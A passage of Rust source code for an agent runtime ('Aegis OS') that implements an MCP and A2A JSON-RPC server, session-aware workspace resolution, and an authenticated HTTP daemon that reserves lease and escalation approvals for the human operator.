                    "description": "[Zero-Prompt] Search the Aegis Application Protocol (AAP-1.0) 3-tier ecosystem catalog (`first_party` e.g. `heurion` Heurion 2.0, `verified`, `community`) and inspect installed & user-authenticated applications.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "query": {
                                "type": "string",
                                "description": "Optional keyword filter (e.g. `heurion`, `medical`, `biostatistics`, `clinical`)."
                            },
                            "category": {
                                "type": "string",
                                "description": "Optional category filter (`first-party`, `medical`, `clinical-research`, `biostatistics`, `verified`)."
                            },
                            "trust_tier": {
                                "type": "string",
                                "enum": ["first_party", "verified", "community"]
                            }
                        }
                    }
                },
                {
                    "name": "app_mount_session",
                    "description": "[Zero-Prompt] Mount an AAP-1.0 application (e.g. `heurion` for Heurion 2.0 Clinical & Biomedical Research) into the current Agent session and inspect its `zero_prompt` vs `lease_gated` MCP tools, bound user account, and recommended SOP skills.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "app_id": {
                                "type": "string",
                                "description": "AAP-1.0 application identifier (e.g. `heurion`)."
                            },
                            "endpoint": {
                                "type": "string",
                                "description": "Optional endpoint URL override (defaults to installed endpoint or `http://127.0.0.1:8787`)."
                            }
                        },
                        "required": ["app_id"]
                    }
                },
                {
                    "name": "app_call_tool",
                    "description": "[AAP-1.0 Proxy] Invoke an MCP tool on an AAP-1.0 application (e.g. `heurion`) over `POST /api/aegis/mcp` with automatic injection of `Authorization: Bearer aegis_at_<app_id>.*`, `X-Aegis-Agent-Id`, `X-Aegis-Session-Id`, and Policy Kernel `X-Aegis-Lease-Token` for `lease_gated` tools.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "app_id": {
                                "type": "string",
                                "description": "AAP-1.0 application identifier (e.g. `heurion`)."
                            },
                            "tool_name": {
                                "type": "string",
                                "description": "Remote MCP tool name on the target app (e.g. `heurion_run_biostats`, `heurion_list_projects`, `heurion_publish_artifact`)."
                            },
                            "arguments": {
                                "type": "object",
                                "description": "JSON arguments object for the remote MCP tool."
                            },
                            "endpoint": {
                                "type": "string",
                                "description": "Optional endpoint URL override."
                            },
                            "lease_token": {
                                "type": "string",
                                "description": "Optional explicit lease token override for `lease_gated` tools."
                            }
                        },
                        "required": ["app_id", "tool_name"]
                    }
                }
            ]
        })
    }

    /// Core JSON-RPC 2.0 MCP message processor shared by both Stdio and Streamable HTTP transports.
    pub async fn handle_jsonrpc_message(
        &self,
        identity: &AgentIdentity,
        req: Value,
    ) -> anyhow::Result<Value> {
        let id = req.get("id").cloned().unwrap_or(Value::Null);
        let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");

        let response = match method {
            "initialize" => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "serverInfo": {
                        "name": "aegis-os-runtime",
                        "version": env!("CARGO_PKG_VERSION")
                    },
                    "capabilities": {
                        "tools": { "listChanged": true },
                        "resources": { "subscribe": true }
                    }
                }
            }),
            "tools/list" => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": Self::mcp_tools_schema()
            }),
            "resources/list" => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "resources": [
                        { "uri": "aegis://workspace/status", "name": "CoW Workspace Status & Diffs" },
                        { "uri": "aegis://ipc/inbox", "name": "Agent IPC Mailbox" },
                        { "uri": "aegis://org/peers", "name": "Organization Active Peers" },
                        { "uri": "aegis://global/peers", "name": "Global Workstation Peers Across All Repositories" },
                        { "uri": "aegis://a2a/agent-cards", "name": "Google A2A Agent Cards Across Workstation" },
                        { "uri": "aegis://a2a/tasks", "name": "Google A2A Stateful Tasks" },
                        { "uri": "aegis://org/shared/catalog", "name": "Organization CAS Artifact Catalog" },
                        { "uri": "aegis://apps/catalog", "name": "AAP-1.0 Application Ecosystem Catalog & Installed Apps" }
                    ]
                }
            }),
            "resources/read" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let uri = params.get("uri").and_then(|v| v.as_str()).unwrap_or("");
                let payload = match uri {
                    "aegis://workspace/status" | "agentos://workspace/status" => {
                        self.call_tool(identity, "workspace_status", json!({})).await?
                    }
                    "aegis://ipc/inbox" | "agentos://ipc/inbox" => {
                        self.call_tool(identity, "ipc_recv", json!({ "unread_only": true }))
                            .await?
                    }
                    "aegis://org/peers" | "agentos://org/peers" | "aegis://global/peers"
                    | "aegis://a2a/agent-cards" => {
                        self.call_tool(identity, "ipc_list_peers", json!({})).await?
                    }
                    "aegis://a2a/tasks" => {
                        self.call_tool(identity, "ipc_task_list", json!({})).await?
                    }
                    "aegis://org/shared/catalog" | "agentos://org/shared/catalog" => {
                        let arts = self.org_storage.list_artifacts(&identity.org_id).await?;
                        json!({ "artifacts": arts })
                    }
                    "aegis://apps/catalog" => {
                        self.app_store.search_catalog(None, None, None).await
                    }
                    _ => json!({ "error": "Unknown resource URI" }),
                };
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "contents": [{
                            "uri": uri,
                            "mimeType": "application/json",
                            "text": serde_json::to_string_pretty(&payload)?
                        }]
                    }
                })
            }
            // Google A2A Protocol JSON-RPC 2.0 Methods (`agent/card`, `tasks/send`, `tasks/get`, `tasks/cancel`, `tasks/list`)
            "agent/card" | "agent/authenticatedExtendedCard" => {
                let peers = self.ipc.list_all_peers().await.unwrap_or_default();
                let cards: Vec<_> = peers
                    .into_iter()
                    .filter(|p| p.online)
                    .map(|p| p.to_agent_card("http://127.0.0.1:7080"))
                    .collect();
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "protocol": "google-a2a/0.2",
                        "self_address": format!("{}/{}", identity.org_id, identity.agent_id),
                        "agents": cards
                    }
                })
            }
            "tasks/send" | "message/send" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let to_agent = params
                    .get("to_agent")
                    .or_else(|| params.get("agent"))
                    .and_then(|v| v.as_str())
                    .unwrap_or(&identity.agent_id);
                let subject = params
                    .get("subject")
                    .or_else(|| {
                        params
                            .get("message")
                            .and_then(|m| m.get("parts"))
                            .and_then(|p| p.as_array())
                            .and_then(|arr| arr.first())
                            .and_then(|part| part.get("text"))
                    })
                    .and_then(|v| v.as_str())
                    .unwrap_or("A2A Task");
                let payload = params
                    .get("payload")
                    .or_else(|| params.get("message"))
                    .cloned()
                    .unwrap_or_else(|| json!({}));
                let attachments: Vec<String> = params
                    .get("attachments")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                match self
                    .call_tool(
                        identity,
                        "ipc_request",
                        json!({
                            "to_agent": to_agent,
                            "subject": subject,
                            "payload": payload,
                            "attachments": attachments
                        }),
                    )
                    .await
                {
                    Ok(sent) => {
                        let task_id = sent.get("msg_id").and_then(|v| v.as_str()).unwrap_or("");
                        let task = self.ipc.get_task(task_id).await.ok().flatten();
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": task.map(|t| serde_json::to_value(t).unwrap_or(sent.clone())).unwrap_or(sent)
                        })
                    }
                    Err(e) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32001, "message": e.to_string() }
                    }),
                }
            }
            "tasks/get" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let task_id = params
                    .get("id")
                    .or_else(|| params.get("task_id"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                match self.ipc.get_task(task_id).await {
                    Ok(Some(task)) if task.visible_to_org(&identity.org_id) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": task
                    }),
                    _ => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32004, "message": format!("A2A task '{}' not found", task_id) }
                    }),
                }
            }
            "tasks/cancel" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let task_id = params
                    .get("id")
                    .or_else(|| params.get("task_id"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let reason = params
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string())
                    .or_else(|| Some("Canceled via A2A tasks/cancel".to_string()));
                let expected_revision = params
                    .get("expected_revision")
                    .and_then(|v| v.as_u64());
                // The IPC bus enforces org ownership plus requester-only cancellation, so a
                // cross-org or non-requester caller gets the same `not found` / refusal answer.
                match self
                    .ipc
                    .update_task_state_cas(
                        identity,
                        task_id,
                        expected_revision,
                        A2ATaskState::Canceled,
                        reason,
                        vec![],
                    )
                    .await
                {
                    Ok(task) => {
                        self.cleanup_terminal_task(identity, &task.id).await;
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": task
                        })
                    }
                    Err(e) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32004, "message": e.to_string() }
                    }),
                }
            }
            "tasks/list" => {
                let tasks = self
                    .ipc
                    .list_tasks(Some(&identity.org_id), None)
                    .await
                    .unwrap_or_default();
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": { "tasks": tasks }
                })
            }
            "tools/call" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let name = params.get("name").and_then(|v| v.as_str()).unwrap_or("");
                let arguments = params
                    .get("arguments")
                    .cloned()
                    .unwrap_or_else(|| json!({}));

                let result = if HUMAN_ONLY_TOOLS.contains(&name) {
                    Err(anyhow::anyhow!(
                        "`{}` is reserved for the human operator; agents cannot grant leases or approve escalations. Ask the user to approve the pending escalation in the Web Approval Console (/approve or /dashboard) or provide their 6-digit TOTP code in chat.",
                        name
                    ))
                } else {
                    self.call_tool(identity, name, arguments).await
                };
                match result {
                    Ok(mut val) => {
                        // Push channel for every MCP client (incl. ones without lifecycle hooks):
                        // piggyback a compact unread-mail summary on each tool result.
                        if !matches!(name, "ipc_recv" | "ipc_ack") {
                            if let (Some(inbox), Some(obj)) =
                                (self.inbox_summary(identity).await, val.as_object_mut())
                            {
                                obj.insert("_aegis_inbox".to_string(), inbox);
                            }
                        }
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": {
                                "content": [{
                                    "type": "text",
                                    "text": serde_json::to_string_pretty(&val)?
                                }]
                            }
                        })
                    }
                    Err(err) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": {
                            "isError": true,
                            "content": [{
                                "type": "text",
                                "text": format!("Aegis OS Syscall Error: {}", err)
                            }]
                        }
                    }),
                }
            }
            _ => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {}
            }),
        };

        Ok(response)
    }

    pub fn extract_workspace_from_init_params(params: &Value) -> Option<PathBuf> {
        let raw_uri = params
            .get("rootUri")
            .and_then(|v| v.as_str())
            .or_else(|| params.get("rootPath").and_then(|v| v.as_str()))
            .or_else(|| {
                params
                    .get("workspaceFolders")
                    .and_then(|v| v.as_array())
                    .and_then(|arr| arr.first())
                    .and_then(|f| f.get("uri").or_else(|| f.get("path")))
                    .and_then(|v| v.as_str())
            })
            .or_else(|| {
                params
                    .get("roots")
                    .and_then(|v| v.as_array())
                    .and_then(|arr| arr.first())
                    .and_then(|f| f.get("uri").or_else(|| f.get("path")))
                    .and_then(|v| v.as_str())
            })?;
        let cleaned = raw_uri.strip_prefix("file://").unwrap_or(raw_uri);
        let p = PathBuf::from(cleaned);
        if p.exists() {
            Some(std::fs::canonicalize(&p).unwrap_or(p))
        } else {
            None
        }
    }

    fn is_repo_root(dir: &Path) -> bool {
        dir.join(".git").exists()
            || dir.join("Cargo.toml").exists()
            || dir.join("package.json").exists()
            || dir.join("pyproject.toml").exists()
            || dir.join("go.mod").exists()
            || dir.join(".aegis").exists()
            || dir.join("Makefile").exists()
            || dir.join("CMakeLists.txt").exists()
            || dir.join("flake.nix").exists()
            || dir.join("pom.xml").exists()
            || dir.join("build.gradle").exists()
            || dir.join("build.gradle.kts").exists()
    }

    /// Returns `true` only when `dir` is a pure multi-project container directory:
    /// 1. `dir` itself is not a project root;
    /// 2. `dir` contains no non-hidden regular files directly at its root;
    /// 3. `dir` contains at least one direct non-hidden child directory that is a project root.
    ///
    /// This prevents non-Git project/paper directories (e.g. `SYLVA/paper/main.tex` with or without
    /// a root `README.md`) from being misclassified as umbrella containers and hijacked to a sibling repo.
    pub fn is_umbrella_parent_dir(dir: &Path) -> bool {
        if !dir.is_dir() || Self::is_repo_root(dir) {
            return false;
        }
        let Ok(entries) = std::fs::read_dir(dir) else {
            return false;
        };
        let mut has_child_repo = false;
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with('.') {
                continue;
            }
            let Ok(ft) = entry.file_type() else {
                continue;
            };
            if ft.is_file() {
                return false;
            }
            if ft.is_dir() && Self::is_repo_root(&entry.path()) {
                has_child_repo = true;
            }
        }
        has_child_repo
    }

    /// If `dir` is an umbrella parent directory (containing one or more child repositories rather than
    /// being a repository root itself), returns the most recently modified child repository root.
    pub fn resolve_umbrella_child_repo(dir: &Path) -> Option<PathBuf> {
        if !Self::is_umbrella_parent_dir(dir) {
            return None;
        }
        let entries = std::fs::read_dir(dir).ok()?;
        let mut best: Option<(std::time::SystemTime, PathBuf)> = None;
        for entry in entries.flatten() {
            let p = entry.path();
            if !p.is_dir() {
                continue;
            }
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with('.') {
                continue;
            }
            if Self::is_repo_root(&p) {
                let mtime = entry
                    .metadata()
                    .and_then(|m| m.modified())
                    .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
                if best.as_ref().is_none_or(|(best_t, _)| mtime >= *best_t) {
                    best = Some((mtime, p));
                }
            }
        }
        best.map(|(_, p)| std::fs::canonicalize(&p).unwrap_or(p))
    }

    /// Resolve the active workspace for a client session without letting concurrent windows
    /// overwrite each other through a global `active_workspace.txt`, and without overriding
    /// explicit non-umbrella directories (like a LaTeX paper folder without `.git`).
    pub fn resolve_workspace_for_session(
        &self,
        base_ws: &Path,
        session_key: Option<&aos_core::session::SessionKey>,
    ) -> PathBuf {
        let session_binding = session_key.and_then(|k| {
            aos_core::session::resolve_workspace_binding_for_key(&self.runtime_data_root, k)
        });
        if let Some((bound_ws, _umbrella, true)) = &session_binding {
            return bound_ws.clone();
        }

        let s = base_ws.to_string_lossy();
        let is_hook_cfg = s.ends_with("/.gemini/config")
            || s.ends_with("/.agents")
            || s.ends_with("/.agent");
        let is_unspecified_ws =
            is_hook_cfg || base_ws == Path::new(".") || base_ws.as_os_str().is_empty();
        if is_unspecified_ws {
            if let Ok(env_ws) = std::env::var("AOS_WORKSPACE") {
                let p = PathBuf::from(env_ws.trim());
                if p.exists() {
                    let canon = std::fs::canonicalize(&p).unwrap_or(p);
                    return if Self::is_umbrella_parent_dir(&canon) {
                        Self::resolve_umbrella_child_repo(&canon).unwrap_or(canon)
                    } else {
                        canon
                    };
                }
            }
        }
        if is_hook_cfg {
            if let Some((bound_ws, _, _)) = session_binding {
                return bound_ws;
            }
            if s.ends_with("/.agents") || s.ends_with("/.agent") {
                if let Some(parent) = base_ws.parent() {
                    let canon_parent =
                        std::fs::canonicalize(parent).unwrap_or_else(|_| parent.to_path_buf());
                    return if Self::is_umbrella_parent_dir(&canon_parent) {
                        Self::resolve_umbrella_child_repo(&canon_parent).unwrap_or(canon_parent)
                    } else {
                        canon_parent
                    };
                }
            }
            if session_key.is_none() {
                let saved_file = self.runtime_data_root.join("active_workspace.txt");
                if let Ok(saved) = std::fs::read_to_string(&saved_file) {
                    let p = PathBuf::from(saved.trim());
                    if p.exists() {
                        let canon = std::fs::canonicalize(&p).unwrap_or(p);
                        return if Self::is_umbrella_parent_dir(&canon) {
                            Self::resolve_umbrella_child_repo(&canon).unwrap_or(canon)
                        } else {
                            canon
                        };
                    }
                }
            }
            return std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf());
        }

        if Self::is_umbrella_parent_dir(base_ws) {
            let canon_umb =
                std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf());
            if let Some((bound_ws, _, _)) = session_binding {
                if bound_ws.starts_with(&canon_umb) && bound_ws != canon_umb {
                    return bound_ws;
                }
            }
            return Self::resolve_umbrella_child_repo(&canon_umb).unwrap_or(canon_umb);
        }

        std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf())
    }

    pub fn resolve_workspace_fallback(&self, current_ws: &Path) -> PathBuf {
        let key = aos_core::session::client_session_key();
        self.resolve_workspace_for_session(current_ws, key.as_ref())
    }

    pub async fn serve_stdio(&self, identity: AgentIdentity) -> anyhow::Result<()> {
        let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        self.serve_stdio_lazy(identity, cwd, false, None).await
    }

    /// Serves MCP over `stdio` with instant (<0.5 ms) `initialize` and `tools/list` handshakes,
    /// deferring `ensure_agent_environment` (CoW cloning) until the first `tools/call` or `resources/read`
    /// and dynamically resolving the workspace path from `initialize` `rootUri`/`workspaceFolders` or AGY hook state.
    ///
    /// `auto_agent_client`: when the agent id was `auto`, the client name (`agy`, `claude`, ...). The
    /// principal is then re-resolved per call from the per-session binding written by lifecycle hooks
    /// (see `aos_core::session`), so every client window is a distinct peer and resumed conversations
    /// keep their identity.
    pub async fn serve_stdio_lazy(
        &self,
        mut identity: AgentIdentity,
        initial_workspace: PathBuf,
        auto_org: bool,
        auto_agent_client: Option<String>,
    ) -> anyhow::Result<()> {
        let session_key = auto_agent_client
            .as_ref()
            .and_then(|_| aos_core::session::client_session_key());
        let ws_session_key = session_key.or_else(aos_core::session::client_session_key);
        let stdin = tokio::io::stdin();
        let mut stdout = tokio::io::stdout();
        let mut reader = BufReader::new(stdin).lines();
        let mut base_workspace = initial_workspace;
        let mut active_workspace =
            self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref());
        if auto_org {
            if let Some(name) = active_workspace.file_name() {
                let name_str = name.to_string_lossy().to_string();
                if name_str != "config" && !name_str.is_empty() {
                    identity.org_id = name_str;
                }
            }
        }

        while let Some(line) = reader.next_line().await? {
            if line.trim().is_empty() {
                continue;
            }
            let req: Value = match serde_json::from_str(&line) {
                Ok(v) => v,
                Err(_) => continue,
            };
            let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");

            // JSON-RPC 2.0 notifications (e.g. `notifications/initialized`) have no `id` and MUST NOT receive a response!
            if req.get("id").is_none() || method.starts_with("notifications/") {
                continue;
            }

            if method == "initialize" {
                if let Some(params) = req.get("params") {
                    if let Some(ws_from_init) = Self::extract_workspace_from_init_params(params) {
                        base_workspace = ws_from_init;
                        if let Some(key) = ws_session_key {
                            if aos_core::session::resolve_workspace_binding_for_key(
                                &self.runtime_data_root,
                                &key,
                            )
                            .is_none()
                            {
                                let resolved = self
                                    .resolve_workspace_for_session(&base_workspace, Some(&key));
                                let umb = if Self::is_umbrella_parent_dir(&base_workspace) {
                                    Some(
                                        std::fs::canonicalize(&base_workspace)
                                            .unwrap_or_else(|_| base_workspace.clone()),
                                    )
                                } else {
                                    None
                                };
                                let client_name = auto_agent_client.as_deref().unwrap_or("auto");
                                let _ = aos_core::session::bind_workspace_for_key(
                                    &self.runtime_data_root,
                                    client_name,
                                    &key,
                                    None,
                                    &resolved,
                                    umb.as_deref(),
                                    false,
                                );
                            }
                        } else {
                            let _ = std::fs::write(
                                self.runtime_data_root.join("active_workspace.txt"),
                                base_workspace.to_string_lossy().as_bytes(),
                            );
                        }
                    }
                }
                active_workspace =
                    self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref());
                if auto_org {
                    if let Some(name) = active_workspace.file_name() {
                        let name_str = name.to_string_lossy().to_string();
                        if name_str != "config" && !name_str.is_empty() {
                            identity.org_id = name_str;
                        }
                    }
                }
            } else if method == "tools/call" || method == "resources/read" {
                active_workspace =
                    self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref());
                if auto_org {
                    if let Some(name) = active_workspace.file_name() {
                        let name_str = name.to_string_lossy().to_string();
                        if name_str != "config" && !name_str.is_empty() {
                            identity.org_id = name_str;
                        }
                    }
                }
                if let (Some(client), Some(key)) = (auto_agent_client.as_ref(), session_key.as_ref()) {
                    identity.agent_id = aos_core::session::resolve_agent_id_for_key(
                        &self.runtime_data_root,
                        client,
                        key,
                    );
                }
                if let Err(err) = self
                    .ensure_agent_environment(
                        identity.clone(),
                        &active_workspace,
                        IsolationTier::NativeOsSandbox,
                        vec!["*".to_string()],
                    )
                    .await
                {
                    let id = req.get("id").cloned().unwrap_or(Value::Null);
                    let err_resp = json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": {
                            "isError": true,
                            "content": [{
                                "type": "text",
                                "text": format!("Aegis OS Environment Initialization Error: {}", err)
                            }]
                        }
                    });
                    let out_line = format!("{}\n", serde_json::to_string(&err_resp)?);
                    stdout.write_all(out_line.as_bytes()).await?;
                    stdout.flush().await?;
                    continue;
                }
                let _ = self
                    .ipc
                    .update_peer_metadata(
                        &identity,
                        auto_agent_client.clone(),
                        session_key.map(|k| k.pid),
                        session_key.map(|k| k.start_time),
                        Some(active_workspace.display().to_string()),
                    )
                    .await;
            }

            let id = req.get("id").cloned().unwrap_or(Value::Null);
            let response = match self.handle_jsonrpc_message(&identity, req).await {
                Ok(resp) => resp,
                Err(err) => json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "isError": true,
                        "content": [{
                            "type": "text",
                            "text": format!("Aegis OS Kernel Error: {}", err)
                        }]
                    }
                }),
            };
            let out_line = format!("{}\n", serde_json::to_string(&response)?);
            stdout.write_all(out_line.as_bytes()).await?;
            stdout.flush().await?;
        }
        Ok(())
    }

    /// Start the multi-tenant Aegis OS HTTP Daemon (`POST /mcp` Streamable HTTP & `GET /api/status`).
    /// Starts the HTTP daemon with authentication required (see [`DaemonAuth::Required`]).
    pub async fn start_http_daemon(
        self: Arc<Self>,
        bind_addr: &str,
        default_workspace: PathBuf,
    ) -> anyhow::Result<std::net::SocketAddr> {
        self.start_http_daemon_with_auth(bind_addr, default_workspace, DaemonAuth::Required)
            .await
    }

    /// The operator credential (`Authorization: Bearer <token>` or `X-Aegis-Admin-Secret`):
    /// `AOS_ADMIN_SECRET`, or a random token generated when the daemon starts without one.
    pub fn operator_token(&self) -> String {
        self.paas.admin_secret()
    }

    pub async fn start_http_daemon_with_auth(
        self: Arc<Self>,
        bind_addr: &str,
        default_workspace: PathBuf,
        auth_mode: DaemonAuth,
    ) -> anyhow::Result<std::net::SocketAddr> {
        if auth_mode == DaemonAuth::Required && self.paas.admin_secret().is_empty() {
            // Held only in memory and printed by the CLI; never written where a sandbox could read it.
            let generated = format!("aop_{}{}", Uuid::new_v4().simple(), Uuid::new_v4().simple());
            self.paas.set_secrets(&generated, &self.paas.webhook_secret());
        }
        let listener = tokio::net::TcpListener::bind(bind_addr).await?;
        let local_addr = listener.local_addr()?;
        let kernel = self.clone();

        // Background Scale-to-Zero Idle Workspace Hibernation Daemon (scans every 60s)
        let k_gc = self.clone();
        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(std::time::Duration::from_secs(60));
            ticker.tick().await;
            loop {
                ticker.tick().await;
                let _ = k_gc.paas.hibernate_idle_workspaces(&k_gc, None).await;
            }
        });

        tokio::spawn(async move {
            loop {
                let Ok((mut stream, _)) = listener.accept().await else {
                    break;
                };
                let k = kernel.clone();
                let ws_path = default_workspace.clone();
                tokio::spawn(async move {
                    use tokio::io::AsyncReadExt;
                    // One deadline for the whole request so slow or stalled clients cannot pin
                    // connections (and their tasks) forever.
                    let deadline = tokio::time::Instant::now() + HTTP_REQUEST_READ_TIMEOUT;
                    let mut buf = Vec::with_capacity(8192);
                    let mut chunk = [0u8; 8192];
                    let header_end = loop {
                        if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                            break pos + 4;
                        }
                        let Ok(Ok(n)) =
                            tokio::time::timeout_at(deadline, stream.read(&mut chunk)).await
                        else {
                            return;
                        };
                        if n == 0 || buf.len() > 4 * 1024 * 1024 {
                            return;
                        }
                        buf.extend_from_slice(&chunk[..n]);
                    };
                    let head = String::from_utf8_lossy(&buf[..header_end - 4]).to_string();
                    let content_length: usize = head
                        .lines()
                        .find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            if k.trim().eq_ignore_ascii_case("content-length") {
                                v.trim().parse::<usize>().ok()
                            } else {
                                None
                            }
                        })
                        .unwrap_or(0);
                    if content_length > MAX_HTTP_BODY_BYTES {
                        let msg = format!(
                            "{{\"error\":\"Request body exceeds {} bytes\"}}",
                            MAX_HTTP_BODY_BYTES
                        );
                        let _ = stream
                            .write_all(
                                format!(
                                    "HTTP/1.1 413 Payload Too Large\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                                    msg.len(),
                                    msg
                                )
                                .as_bytes(),
                            )
                            .await;
                        return;
                    }
                    while buf.len() < header_end + content_length {
                        let Ok(Ok(n)) =
                            tokio::time::timeout_at(deadline, stream.read(&mut chunk)).await
                        else {
                            break;
                        };
                        if n == 0 {
                            break;
                        }
                        buf.extend_from_slice(&chunk[..n]);
                    }
                    let body_end = (header_end + content_length).min(buf.len());
                    let body_str = String::from_utf8_lossy(&buf[header_end..body_end]).to_string();
                    let mut head_lines = head.lines();
                    let req_line = head_lines.next().unwrap_or("");
                    let parts: Vec<&str> = req_line.split_whitespace().collect();
                    let method = parts.first().copied().unwrap_or("GET");
                    let full_target = parts.get(1).copied().unwrap_or("/");

                    let mut headers = HashMap::new();
                    for l in head_lines {
                        if let Some((hk, hv)) = l.split_once(':') {
                            headers.insert(hk.trim().to_lowercase(), hv.trim().to_string());
                        }
                    }

                    let mut org_id = headers
                        .get("x-aegis-org")
                        .cloned()
                        .unwrap_or_else(|| "default-org".to_string());
                    let mut agent_id = headers
                        .get("x-aegis-agent")
                        .cloned()
                        .unwrap_or_else(|| "http-agent".to_string());
                    let mut role = headers
                        .get("x-aegis-role")
                        .cloned()
                        .unwrap_or_else(|| "Remote MCP Agent".to_string());
                    let mut bound_ws_id = headers.get("x-aegis-workspace").cloned();
                    let mut bound_ws_path = ws_path.clone();

                    // Callers are the operator (admin secret / generated token), a tenant API key
                    // (`ak_live_*`), or anonymous. With `DaemonAuth::Required`, anonymous callers
                    // only reach public routes and keys are confined to their own org.
                    let raw_auth = headers
                        .get("authorization")
                        .or_else(|| headers.get("x-aegis-api-key"))
                        .cloned();
                    let bearer = raw_auth.as_deref().map(|t| {
                        let t = t.trim();
                        t.strip_prefix("Bearer ")
                            .or_else(|| t.strip_prefix("bearer "))
                            .unwrap_or(t)
                            .trim()
                            .to_string()
                    });
                    let operator_secret = k.paas.admin_secret();
                    let is_operator = [bearer.as_deref(), headers.get("x-aegis-admin-secret").map(|s| s.trim())]
                        .into_iter()
                        .flatten()
                        .any(|cred| paas::PaasControlPlane::secrets_match(cred, &operator_secret));
                    let mut key_org: Option<String> = None;
                    let mut auth_failed = false;
                    if is_operator {
                        if let Some(ref ws_id) = bound_ws_id {
                            if let Some(ws_rec) = k.paas.get_workspace(&org_id, ws_id).await {
                                bound_ws_path = ws_rec.host_repo_path;
                            }
                        }
                    } else if let Some(ref token_hdr) = raw_auth {
                        if let Some(key_rec) = k.paas.authenticate_token(token_hdr).await {
                            key_org = Some(key_rec.org_id.clone());
                            org_id = key_rec.org_id;
                            if !headers.contains_key("x-aegis-agent") {
                                agent_id = key_rec.agent_id;
                            }
                            if !headers.contains_key("x-aegis-role") {
                                role = key_rec.role;
                            }
                            if let Some(ref ws_id) = key_rec.workspace_id {
                                bound_ws_id = Some(ws_id.clone());
                                if let Some(ws_rec) = k.paas.get_workspace(&org_id, ws_id).await {
                                    bound_ws_path = ws_rec.host_repo_path;
                                }
                            }
                        } else {
                            auth_failed = true;
                        }
                    } else if auth_mode == DaemonAuth::Required {
                        // Anonymous: identity headers carry no authority.
                        if !is_public_route(method, full_target) {
                            auth_failed = true;
                        }
                    } else if let Some(ref ws_id) = bound_ws_id {
                        if let Some(ws_rec) = k.paas.get_workspace(&org_id, ws_id).await {
                            bound_ws_path = ws_rec.host_repo_path;
                        }
                    }
                    let forbidden: Option<String> = if auth_mode == DaemonAuth::Disabled || auth_failed {
                        None
                    } else if is_operator_only_route(method, full_target) && !is_operator {
                        Some("This endpoint is reserved for the operator (Authorization: Bearer <operator token> or X-Aegis-Admin-Secret); tenant/agent API keys cannot use it.".to_string())
                    } else {
                        key_org.as_deref().and_then(|own| {
                            requested_orgs(full_target, &body_str)
                                .into_iter()
                                .find(|req| req != own)
                                .map(|req| format!("API key for org '{}' cannot access org '{}'", own, req))
                        })
                    };

                    if method == "GET" && full_target.starts_with("/releases/") {
                        let name = full_target
                            .trim_start_matches("/releases/")
                            .split('?')
                            .next()
                            .unwrap_or("");
                        if !name.is_empty() && !name.contains("..") && !name.contains('/') {
                            let file_path = k.runtime_data_root.join("releases").join(name);
                            if let Ok(bytes) = tokio::fs::read(&file_path).await {
                                let hdr = format!(
                                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                                    bytes.len()
                                );
                                let _ = stream.write_all(hdr.as_bytes()).await;
                                let _ = stream.write_all(&bytes).await;
                                return;
                            }
                        }
                    }

                    let mut content_type = "application/json";
                    let (status_line, resp_body) = if auth_failed {
                        (
                            "HTTP/1.1 401 Unauthorized",
                            json!({
                                "error": "Invalid or missing Aegis Cloud API key (expected `Authorization: Bearer ak_live_...`)"
                            })
                            .to_string(),
                        )
                    } else if let Some(reason) = forbidden {
                        ("HTTP/1.1 403 Forbidden", json!({ "error": reason }).to_string())
                    } else if method == "GET"
                        && (full_target == "/"
                            || full_target.starts_with("/dashboard")
                            || full_target.starts_with("/ui"))
                    {
                        content_type = "text/html; charset=utf-8";
